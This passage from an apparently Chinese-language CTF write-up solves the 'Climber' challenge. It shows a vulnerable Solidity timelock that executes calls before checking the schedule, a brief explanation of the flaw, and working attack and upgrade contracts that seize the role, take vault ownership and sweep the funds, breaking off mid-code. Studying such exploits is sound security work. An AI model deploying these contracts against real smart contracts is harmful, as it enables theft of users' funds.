punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Operations are tracked by their bytes32 identifier</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> <span class=\"token operator\">=></span> Operation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> operations<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint64</span> <span class=\"token keyword\">public</span> delay <span class=\"token operator\">=</span> <span class=\"token number\">1</span> hours<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> admin<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> proposer\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_setRoleAdmin</span><span class=\"token punctuation\">(</span>ADMIN_ROLE<span class=\"token punctuation\">,</span> ADMIN_ROLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_setRoleAdmin</span><span class=\"token punctuation\">(</span>PROPOSER_ROLE<span class=\"token punctuation\">,</span> ADMIN_ROLE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// deployer + self administration</span>\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>ADMIN_ROLE<span class=\"token punctuation\">,</span> admin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>ADMIN_ROLE<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>PROPOSER_ROLE<span class=\"token punctuation\">,</span> proposer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getOperationState</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span>OperationState<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        Operation <span class=\"token keyword\">memory</span> op <span class=\"token operator\">=</span> operations<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">.</span>executed<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> OperationState<span class=\"token punctuation\">.</span>Executed<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">.</span>readyAtTimestamp <span class=\"token operator\">>=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> OperationState<span class=\"token punctuation\">.</span>ReadyForExecution<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>op<span class=\"token punctuation\">.</span>readyAtTimestamp <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> OperationState<span class=\"token punctuation\">.</span>Scheduled<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> OperationState<span class=\"token punctuation\">.</span>Unknown<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getOperationId</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> salt\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> salt\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token function\">onlyRole</span><span class=\"token punctuation\">(</span>PROPOSER_ROLE<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&lt;</span> <span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> values<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> dataElements<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> id <span class=\"token operator\">=</span> <span class=\"token function\">getOperationId</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">getOperationState</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> OperationState<span class=\"token punctuation\">.</span>Unknown<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Operation already known\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        operations<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>readyAtTimestamp <span class=\"token operator\">=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> delay<span class=\"token punctuation\">;</span>\n        operations<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>known <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/** Anyone can execute what has been scheduled via `schedule` */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes32</span> salt\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Must provide at least one target\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> values<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> dataElements<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes32</span> id <span class=\"token operator\">=</span> <span class=\"token function\">getOperationId</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> targets<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            targets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>dataElements<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">getOperationState</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> OperationState<span class=\"token punctuation\">.</span>ReadyForExecution<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        operations<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>executed <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">updateDelay</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span> newDelay<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Caller must be timelock itself\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>newDelay <span class=\"token operator\">&lt;=</span> <span class=\"token number\">14</span> days<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Delay must be 14 days or less\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        delay <span class=\"token operator\">=</span> newDelay<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-11\"><a href=\"#analyze-11\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>问题1：只有sweepFunds(0函数可以一次性取走全部的token，但是该函数被限制为onlySweeper，显然这里不可行，但是合约可以升级，我们可以升级合约去除onlySweeper限制</p>\n<p>问题2：分析ClimberTimelock合约下的execute()函数，发现函数的执行逻辑存在问题，先执行再判断限制条件，所以会产生漏洞，可以在execute()函数下的call处调用schedule()函数使得execute()函数的最后一条require条件满足，但是发现这行不通，因为调用函数时进行了role检测，显然我们没有role，但是我们可以grantRole进行set，为攻击合约setrole，然后在攻击合约下调用schedule()函数。</p>\n<p>分析到这里这道题基本就已经解决了，剩下就是编写攻击合约以及编写更新合约的问题了</p>\n<h2 id=\"attack-11\"><a href=\"#attack-11\" class=\"headerlink\" title=\"attack\"></a>attack</h2><p>attackcontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ClimberVault1</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">ClimberTimelock1</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes32</span> salt<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> targets<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> values<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> dataElements<span class=\"token punctuation\">,</span><span class=\"token builtin\">bytes32</span> salt<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attackclimber</span> <span class=\"token punctuation\">&#123;</span>\n    ClimberVault1 <span class=\"token keyword\">public</span> vault<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> timelock<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> targets<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> values<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> dataElements<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> salt<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _vault<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _timelock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        vault <span class=\"token operator\">=</span> <span class=\"token function\">ClimberVault1</span><span class=\"token punctuation\">(</span>_vault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        timelock <span class=\"token operator\">=</span> _timelock<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> attacker<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>timelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>timelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>vault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"updateDelay(uint64)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data0 <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n            <span class=\"token string\">\"grantRole(bytes32,address)\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PROPOSER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data1 <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span>\n            <span class=\"token string\">\"transferOwnership(address)\"</span><span class=\"token punctuation\">,</span>\n            attacker\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> data2 <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"schedule()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        dataElements<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        dataElements<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>data0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        dataElements<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>data1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        dataElements<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>data2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        salt<span class=\"token operator\">=</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"66\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">ClimberTimelock1</span><span class=\"token punctuation\">(</span>timelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">ClimberTimelock1</span><span class=\"token punctuation\">(</span>timelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> salt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>upgradecontract</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Initializable</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">OwnableUpgradeable</span><span class=\"token punctuation\">&#123;</span>\n   \n    \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">UUPSUpgradeable</span><span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">IERC20</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">UpgradedAttacker</span> <span class=\"token keyword\">is</span> Initializable<span class=\"token punctuation\">,</span> OwnableUpgradeable<span class=\"token punctuation\">,</span> UUPSUpgradeable <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WITHDRAWAL_LIMIT <span class=\"token operator\">=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> WAITING_PERIOD <span class=\"token operator\">=</span> <span class=\"token number\">15</span> days<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> _lastWithdrawalTimestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _sweeper<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">initializer</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/// @custom:oz-upgrades-unsafe-allow constructor</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> initializer <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> initializer <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">__Ownable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">__UUPSUpgradeable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span>  <span class=\"token punctuation\">&#123;</span>\n        IERC20 token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span 